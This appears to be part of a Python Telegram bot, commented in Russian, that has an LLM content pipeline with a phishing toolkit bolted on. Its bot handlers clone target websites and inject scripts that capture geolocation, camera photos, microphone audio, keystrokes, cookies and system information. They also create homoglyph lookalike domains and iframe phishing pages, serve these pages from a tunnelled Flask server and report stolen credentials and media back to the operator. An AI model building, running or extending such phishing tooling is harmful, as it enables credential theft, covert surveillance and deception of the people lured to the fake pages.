                send_message("❌ Ошибка экспорта: {}".format(e), chat_id)
        _run_in_thread(_do_export)

    elif action == 'clear_logs':
        fish_db.clear_all_logs()
        send_message("🧹 Логи и БД очищены.", chat_id,
                     reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'status':
        turl = fish_bot_state.tunnel_url
        tunnel_ok = fish_bot_state.tunnel_process and fish_bot_state.tunnel_process.poll() is None
        active_info = fish_downloader.get_active_page_info()
        active_str = "✅ ID: {}".format(active_info[0]) if active_info else "❌ нет"
        try:
            cc, gc, wc, mc, vc = fish_db.get_stats()
            stats_str = "Крединш: {} | Гео: {} | Фото: {} | Аудио: {} | Визиты: {}".format(
                cc, gc, wc, mc, vc)
        except Exception:
            stats_str = "n/a"
        send_message(
            "ℹ️ <b>Статус фишинга</b>\n\n"
            "🌍 Туннель: {} | {}\n"
            "📄 Активная стр.: {}\n"
            "🖥 Flask порт: {}\n"
            "📊 {}".format(
                "🟢 работает" if tunnel_ok else "🔴 стоп",
                turl or "нет URL",
                active_str,
                _fish_cfg.SERVER_PORT,
                stats_str),
            chat_id, reply_markup=kb([back_btn("menu_fish")]))


def _fish_process_load(chat_id, url, inject_geo=False, inject_media=False,
                        fake_domain=False, capture_photo=True, capture_audio=True):
    """Скачивает страницу и активирует её с прогресс-статусами."""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    fish_bot_state.last_loaded_url = url

    # Отправляем первое сообщение и запоминаем его ID для последующего
    # редактирования — так пользователь видит прогресс в одном месте,
    # а не получает 5 отдельных сообщений.
    msg = send_message("⏬ Скачиваю {}...".format(url), chat_id)
    msg_id = msg.get('result', {}).get('message_id') if msg else None

    def _status(text):
        """Редактируем существующее сообщение или шлём новое."""
        if msg_id:
            try:
                edit_message(chat_id, msg_id, text)
                return
            except Exception:
                pass
        send_message(text, chat_id)

    def _do():
        try:
            # on_status передаём чтобы download_page мог обновлять статус
            # пока идёт скачивание — иначе пользователь видит тишину 20-30 сек
            html = fish_downloader.download_page(url, on_status=_status)
            _status("⚙️ Применяю скрипты...")
            html = fish_utils.inject_scripts(
                html, geo=inject_geo, media=inject_media,
                capture_photo=capture_photo, capture_audio=capture_audio)
            if fake_domain:
                from urllib.parse import urlparse
                orig = urlparse(url).netloc
                fake = fish_utils.generate_homoglyph_domain(orig)
                html = fish_utils.replace_domain_in_html(html, orig, fake)
            pid = fish_downloader.save_page(html, url, 'single')
            fish_downloader.set_active_page(pid)
            send_message(
                "✅ Страница сохранена и активирована!\nID: <code>{}</code>".format(pid),
                chat_id, reply_markup=kb([back_btn("menu_fish")]))
        except Exception as e:
            send_message("❌ Ошибка: {}".format(e), chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
    _run_in_thread(_do)


def _fish_handle_wait_state(state, text, chat_id):
    """Обрабатывает состояния ожидания для фишинг-модуля. Возвращает True если обработано."""
    if not state.startswith('fish_') or not FISH_ENABLED:
        return False

    if state == 'fish_load_url':
        _fish_process_load(chat_id, text)

    elif state == 'fish_fullsite_url':
        url = text if text.startswith(('http://', 'https://')) else 'https://' + text
        send_message("🌐 Скачиваю весь сайт... (может занять минуту)", chat_id)
        def _do_fs():
            try:
                _, site_dir = fish_downloader.download_full_site(url, _fish_cfg.DOWNLOADS_DIR)
                pid = fish_downloader.save_full_site(url, site_dir)
                fish_downloader.set_active_page(pid)
                send_message("✅ Сайт скачан! ID: <code>{}</code>".format(pid),
                             chat_id, reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка: {}".format(e), chat_id)
        _run_in_thread(_do_fs)

    elif state == 'fish_load_geo_url':
        _fish_process_load(chat_id, text, inject_geo=True)

    elif state == 'fish_load_cam_url':
        _fish_process_load(chat_id, text, inject_media=True, capture_photo=True, capture_audio=False)

    elif state == 'fish_load_mic_url':
        _fish_process_load(chat_id, text, inject_media=True, capture_photo=False, capture_audio=True)

    elif state == 'fish_payload_url':
        url = text if text.startswith(('http://', 'https://')) else 'https://' + text
        html = fish_utils.generate_redirect_page(url)
        pid = fish_downloader.save_page(html, "payload_{}".format(url), 'redirect')
        fish_downloader.set_active_page(pid)
        send_message("✅ Payload-редирект создан! ID: <code>{}</code>".format(pid),
                     chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_use_page':
        ok = fish_downloader.set_active_page(text.strip())
        send_message("✅ Активирована: {}".format(text) if ok else "❌ Страница не найдена: {}".format(text),
                     chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_clone_page':
        new_id = fish_downloader.clone_page(text.strip())
        send_message("✅ Клон создан: <code>{}</code>".format(new_id) if new_id else "❌ Страница не найдена",
                     chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_gen_domain':
        domain = text.strip()
        fake = fish_utils.generate_homoglyph_domain(domain)
        send_message(
            "🔀 Оригинал: <code>{}</code>\n🎭 Похожий: <code>{}</code>".format(domain, fake),
            chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_iframe_url':
        opts = _fish_user_opts.setdefault(chat_id, {})
        url = text if text.startswith(('http://', 'https://')) else 'https://' + text
        opts['iframe_url'] = url
        opts['iframe_phish'] = True
        _fish_send_options(chat_id)

    else:
        return False
    return True


def _fish_handle_selfile(file_id_str, chat_id):
    """Обработка выбора файла для страницы скачивания."""
    try:
        fid = int(file_id_str)
    except Exception:
        send_message("❌ Неверный ID", chat_id)
        return
    _fish_user_data[chat_id] = {'file_id': fid}
    _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })
    _fish_send_options(chat_id)


def _fish_handle_opt(toggle, chat_id):
    """Переключает опции инжекций."""
    opts = _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })
    if toggle == 'geo':
        opts['geo'] = not opts['geo']
    elif toggle == 'cam':
        opts['cam'] = not opts['cam']
    elif toggle == 'mic':
        opts['mic'] = not opts['mic']
    elif toggle == 'auto':
        opts['auto'] = not opts['auto']
    elif toggle == 'keylogger':
        opts['keylogger'] = not opts.get('keylogger', False)
    elif toggle == 'cookies':
        opts['steal_cookies'] = not opts.get('steal_cookies', False)
    elif toggle == 'sysinfo':
        opts['system_info'] = not opts.get('system_info', False)
    elif toggle == 'iframe':
        current = opts.get('iframe_phish', False)
        opts['iframe_phish'] = not current
        if not current:
            # Нужен URL
            _wait_state[chat_id] = 'fish_iframe_url'
            send_message("Введи URL оригинальной страницы для iframe (например, https://vk.com):",
                         chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))
            return
    elif toggle == 'generate':
        fid = _fish_user_data.get(chat_id, {}).get('file_id')
        if not fid:
            send_message("❌ Файл не выбран", chat_id)
            return
        files = fish_db.get_all_files()
        file_info = next((f for f in files if f['id'] == fid), None)
        if not file_info:
            send_message("❌ Файл не найден", chat_id)
            return
        fname = file_info['original_name']

        dl_tmpl_path = _fish_cfg.DOWNLOAD_TEMPLATE_PATH
        if os.path.exists(dl_tmpl_path):
            with open(dl_tmpl_path, 'r', encoding='utf-8') as f:
                html = f.read()
        else:
            html = (
                "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
                "<title>Скачать {fn}</title></head><body>"
                "<h1>📥 {fn}</h1><a href='/download/{fid}'>Скачать</a>"
                "</body></html>"
            ).format(fn=fname, fid=fid)

        html = html.replace('{file_id}', str(fid)).replace('{file_name}', fname)
        html = fish_utils.inject_scripts(
            html,
            geo=opts.get('geo', False),
            media=opts.get('cam', False) or opts.get('mic', False),
            capture_photo=opts.get('cam', False),
            capture_audio=opts.get('mic', False),
            download_file_id=fid,
            auto_download=opts.get('auto', False),
            keylogger=opts.get('keylogger', False),
            steal_cookies=opts.get('steal_cookies', False),
            system_info=opts.get('system_info', False),
            iframe_phish=opts.get('iframe_phish', False),
            iframe_url=opts.get('iframe_url'),
        )
        pid = fish_downloader.save_page(html, "dl_page_{}".format(fid), 'download')
        fish_downloader.set_active_page(pid)
        _fish_user_data.pop(chat_id, None)
        _fish_user_opts.pop(chat_id, None)
        send_message("✅ Страница скачивания создана!\nID: <code>{}</code>".format(pid),
                     chat_id, reply_markup=kb([back_btn("menu_fish")]))
        return

    _fish_send_options(chat_id)


# ════════════════════════════════════════════════════════════

def _help_text():
    styles_list = "\n".join(
        "{} <b>{}</b> — {}".format(s['emoji'], s['name'], s['description'])
        for s in STYLES.values()
    )
    return (
        "❓ <b>АВТОМУВИ — справка</b>\n\n"
        "Управляй всем через кнопки меню — команды вводить не нужно.\n\n"
        "<b>Команды (если нужно):</b>\n"
        "/menu — главное меню\n"
        "/run — полный цикл\n"
        "/parse — только парсинг\n"
        "/process — обработать накопленное\n"
        "/voices — список голосов TTS\n"
        "/setprompt — задать свой промт\n"
        "/llm [провайдер] — сменить провайдера\n"
        "/fix — исправить ошибку в коде (авто-агент)\n"
        "/analyze — анализ кода\n"
        "/setllm провайдер модель [key]\n"
        "/provider — быстрая смена LLM\n"
        "/llm — то же самое\n"
        "/env — текущие настройки\n\n"
        "<b>LLM провайдеры:</b>\n"
        "openai | gemini | mistral | claude\n"
        "deepseek | groq | xai | kimi | ollama\n\n"
        "<b>Стили переписывания:</b>\n" + styles_list
    )


# ══════════════════════════════════════════════════════════════
#  SCHEDULER
# ══════════════════════════════════════════════════════════════

def scheduled_cycle():
    print("\n⏰ Авто-запуск...", flush=True)
    send_message("⏰ Автоматический запуск по расписанию...")
    try:
        parse_all()
        run_pipeline()
    except Exception as e:
        send_message("❌ Ошибка авто-цикла: {}".format(e))

def _run_scheduler():
    while True:
        schedule.run_pending()
        time.sleep(30)


# ══════════════════════════════════════════════════════════════
#  POLLING LOOP
# ══════════════════════════════════════════════════════════════


def handle_document(msg, chat_id):
    """Обрабатывает файл присланный пользователем."""
    doc      = msg.get('document', {})
    file_id  = doc.get('file_id')
    filename = doc.get('file_name', 'file')
    filesize = doc.get('file_size', 0)
    caption  = msg.get('caption', '')   # текст подписи под файлом

    # Лимит Telegram Bot API — 20 MB
    if filesize > 20 * 1024 * 1024:
        send_message(
            "❌ Файл слишком большой ({:.1f} MB). Telegram позволяет скачивать до 20 MB.".format(
                filesize / 1024 / 1024), chat_id)
        return

    send_message("📥 Скачиваю <b>{}</b>...".format(filename), chat_id)

    dest_path = get_dest_path(filename)
    ok = download_file(file_id, dest_path)

    if not ok:
        send_message("❌ Не удалось скачать файл. Попробуй ещё раз.", chat_id)
        return

    send_message("🔍 Анализирую файл...", chat_id)

    # Контекст: если активна ИИ-сессия — передаём caption + историю
    hint = caption or ''
    sess = get_session(chat_id)
    if sess and sess['mode'] == 'chat' and not hint:
        # Берём последнее сообщение из истории как подсказку
        history = sess.get('history', [])
        if history and history[-1]['role'] == 'user':
            hint = history[-1]['content']

    try:
        result = analyze_file(dest_path, filename, user_hint=hint)
    except Exception as e:
        result = "❌ Ошибка анализа: {}".format(e)

    # ── КОДЕР-СЕССИЯ: анализируем → спрашиваем что дальше ──
    if sess and sess['mode'] == 'code':
        from chat_agent import add_to_history
        add_to_history(chat_id, 'user', '[Файл: {}] {}'.format(filename, hint or 'анализ'))
        add_to_history(chat_id, 'assistant', result[:500])

        # Сохраняем файл для дальнейших действий
        _pending_file[chat_id] = {
            'path':     dest_path,
            'filename': filename,
            'analysis': result,
        }

        # Отправляем анализ + "что дальше?"
        analysis_preview = result[:3500] if len(result) > 3500 else result
        send_message(
            "📂 <b>{}</b>\n\n{}\n\n<b>Что делать дальше?</b>".format(filename, analysis_preview),
            chat_id, reply_markup=after_file_keyboard()
        )
        return

    # Если активна чат-сессия — добавляем в историю
    if sess:
        from chat_agent import add_to_history
        add_to_history(chat_id, 'user', '[Файл: {}] {}'.format(filename, hint))
        add_to_history(chat_id, 'assistant', result[:500])

    # Telegram лимит 4096 символов на сообщение
    if len(result) > 4096:
        # Отправляем частями
        chunks = [result[i:i+4000] for i in range(0, len(result), 4000)]
        for i, chunk in enumerate(chunks):
            suffix = " ({}/{})".format(i+1, len(chunks)) if len(chunks) > 1 else ""
            send_message(chunk + suffix, chat_id,
                        reply_markup=chat_control_keyboard() if sess else kb(
                            [btn("📋 Меню", "menu")]
                        ))
    else:
        send_message(result, chat_id,
                    reply_markup=chat_control_keyboard() if sess else kb(
                        [btn("📋 Меню", "menu"),
                         btn("💬 Обсудить в чате", "agent_chat_start")]
                    ))



def _show_models_page(chat_id, models, page=0, msg_id=None):
    """Показывает страницу бесплатных моделей с кнопками."""
    text, buttons_data = format_free_models_keyboard(models, page=page)

    # Конвертируем buttons_data в kb() формат
    rows = []
    for row in buttons_data:
        rows.append([btn(label, cb) for label, cb in row])
    rows.append([back_btn("menu_llm")])

    markup = kb(*rows) if rows else None
    if msg_id:
        edit_message(chat_id, msg_id, text, reply_markup=markup)
    else:
        send_message(text, chat_id, reply_markup=markup)


def poll():
    offset = 0
    print("🤖 Polling запущен. Отправь /menu боту.", flush=True)

    # Авто-проверка текущего провайдера при старте (только читаем, не меняем)
    def _startup_check():
        import time as _t; _t.sleep(3)
        provider = config.LLM_PROVIDER
        model    = config.LLM_MODEL
        # Берём ключ специфичный для провайдера
        from llm_checker import _get_key_for_provider
        key = _get_key_for_provider(provider)
        result = check_provider(provider, api_key=key)
        if result['ok']:
            print("  ✅ LLM {}/{} — OK".format(provider, model), flush=True)
        else:
            err = result['error'] or 'недоступен'
            no_key = not key
            if no_key:
                print("  ⚠️ LLM {} — нет ключа в .env".format(provider), flush=True)
            else:
                print("  ❌ LLM {} — {}".format(provider, err), flush=True)
            print("     → /menu → 🧠 LLM → 🔍 Проверить провайдеры", flush=True)
    _run_in_thread(_startup_check)
    while True:
        try:
            updates = get_updates(offset)
            for upd in updates:
                offset = upd['update_id'] + 1

                # Inline-кнопка нажата
                if 'callback_query' in upd:
                    try:
                        handle_callback(upd['callback_query'])
                    except Exception as e:
                        print("⚠️ Callback dispatch error: {}".format(e), flush=True)
                    continue

                # Обычное сообщение (текст или файл)
                msg  = upd.get('message', {})
                cid  = str(msg.get('chat', {}).get('id', ''))
                if not cid:
                    continue

                # ── Кэшируем username/first_name для auth_module ──
                _from = msg.get('from', {})
                if _from:
                    _tg_user_cache[cid] = {
                        'username':   _from.get('username', ''),
                        'first_name': _from.get('first_name', ''),
                    }

                # Файл / документ
                doc = msg.get('document')
                if doc:
                    try:
                        handle_document(msg, cid)
                    except Exception as e:
                        send_message("❌ Ошибка обработки файла: {}".format(e), cid)
                    continue

                # Текст
                text = msg.get('text', '')
                if text:
                    try:
                        handle_text(text, cid)
                    except Exception as e:
                        send_message("❌ Ошибка: {}".format(e), cid)

        except Exception as e:
            print("⚠️ Poll outer error: {}".format(e), flush=True)
        time.sleep(2)


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def main():
    print("🚀 АВТОМУВИ v2.1 стартует...", flush=True)
    print("📁 Директория: {}".format(config.BASE_DIR), flush=True)
    print("🧠 LLM: {} / {}".format(config.LLM_PROVIDER, config.LLM_MODEL), flush=True)
    print("🎙  TTS: {} / {}".format(config.TTS_PROVIDER, config.TTS_VOICE), flush=True)

    init_db()

    # ── Auth v2 инициализация ─────────────────────────────────
    if AUTH_ENABLED:
        try:
            _auth.init_db()
            print("  ✅ Auth DB готова", flush=True)
        except Exception as e:
            print(f"  ⚠️ Auth init: {e}", flush=True)

    # Удаляем вебхук если был — иначе getUpdates не работает
    delete_webhook()

    schedule.every(config.PARSE_INTERVAL_HOURS).hours.do(scheduled_cycle)
    threading.Thread(target=_run_scheduler, daemon=True).start()

    send_message(
        "🤖 <b>АВТОМУВИ v2.1 запущен!</b>\n"
        "LLM: {} / {}\n"
        "TTS: {} / {}\n\n"
        "👇 Нажми меню для управления".format(
            config.LLM_PROVIDER, config.LLM_MODEL,
            config.TTS_PROVIDER, config.TTS_VOICE),
        reply_markup=menu_keyboard()
    )

    # ── Запускаем Flask (фишинг веб-сервер) в отдельном потоке ──
    if FISH_ENABLED:
        try:
            fish_db.init_db()
            from fish_web import app as fish_app

            import socket as _sock
            import time as _t

            _p = _fish_cfg.SERVER_PORT

            def _kill_port(port):
                """Убиваем процесс занявший порт через несколько методов."""
                # Метод 1: fuser (нужен пакет psmisc / procps в Termux)
                try:
                    subprocess.run(
                        ["fuser", "-k", "{}/tcp".format(port)],
                        capture_output=True, timeout=5
                    )
                except Exception:
                    pass
                # Метод 2: через /proc — ищем PID у которого открыт порт
                try:
                    inode_target = None
                    with open("/proc/net/tcp", "r") as f:
                        for line in f:
                            parts = line.split()
                            if len(parts) < 4:
                                continue
                            local = parts[1]
                            # Порт в hex в little-endian: :1388 = 5000
                            hex_port = local.split(":")[1] if ":" in local else ""
                            if hex_port and int(hex_port, 16) == port:
                                inode_target = parts[9] if len(parts) > 9 else None
                                break
                    if inode_target:
                        import os as _os
                        for pid in _os.listdir("/proc"):
                            if not pid.isdigit():
                                continue
                            fd_dir = "/proc/{}/fd".format(pid)
                            try:
                                for fd in _os.listdir(fd_dir):
                                    link = _os.readlink("{}/{}".format(fd_dir, fd))
                                    if "socket:[{}]".format(inode_target) in link:
                                        _os.kill(int(pid), 9)  # SIGKILL — гарантированно
                                        break
                            except Exception:
                                continue
                except Exception:
                    pass

            def _port_free(port):
                """
                Честная проверка: свободен ли порт для нового процесса.

                ВАЖНО: НЕ используем SO_REUSEPORT здесь — иначе тест даёт
                ложноположительный результат. Flask (Werkzeug) создаёт сокет
                без SO_REUSEPORT, поэтому тест должен имитировать именно его
                поведение. Только SO_REUSEADDR — чтобы игнорировать TIME_WAIT
                так же как это делает Werkzeug по умолчанию.
                """
                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                    s.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
                    try:
                        s.bind(("0.0.0.0", port))
                        return True
                    except OSError:
                        return False

            # Если порт занят — пробуем убить, затем ждём с повторными
            # проверками вместо фиксированного sleep(2).
            # TIME_WAIT обычно проходит за 5-15 сек, проверяем каждую секунду.
            if not _port_free(_p):
                print(f"  ⚠️ Порт {_p} занят, пробуем освободить...", flush=True)
                _kill_port(_p)
                freed = False
                for _attempt in range(10):  # ждём до 10 сек
                    _t.sleep(1)
                    if _port_free(_p):
                        freed = True
                        print(f"  ✅ Порт {_p} освобождён за {_attempt + 1} сек", flush=True)
                        break
                if not freed:
                    print(f"  ⚠️ Порт {_p} всё ещё занят после 10 сек", flush=True)

            if not fish_bot_state.server_running:
                def _run_fish_flask():
                    fish_bot_state.server_running = True
                    try:
                        fish_app.run(
                            host=_fish_cfg.SERVER_HOST,
                            port=_p,
                            debug=False, threaded=True, use_reloader=False
                        )
                    except OSError as flask_err:
                        # Последний шанс — пробуем ещё раз через секунду
                        # (TIME_WAIT мог только что истечь)
                        print(f"  ⚠️ Flask: {flask_err}, повторная попытка через 3 сек...", flush=True)
                        _t.sleep(3)
                        try:
                            fish_app.run(
                                host=_fish_cfg.SERVER_HOST,
                                port=_p,
                                debug=False, threaded=True, use_reloader=False
                            )
                        except Exception as e2:
                            print(f"  ❌ Flask не запустился: {e2}", flush=True)
                    finally:
                        fish_bot_state.server_running = False

                threading.Thread(target=_run_fish_flask, daemon=True, name="fish-flask-auto").start()
                print(f"  🎣 Fish Flask запускается на порту {_p}...", flush=True)
        except Exception as _fe:
            print(f"  ⚠️ Fish Flask не запустился: {_fe}", flush=True)

    poll()

if __name__ == '__main__':
    main()
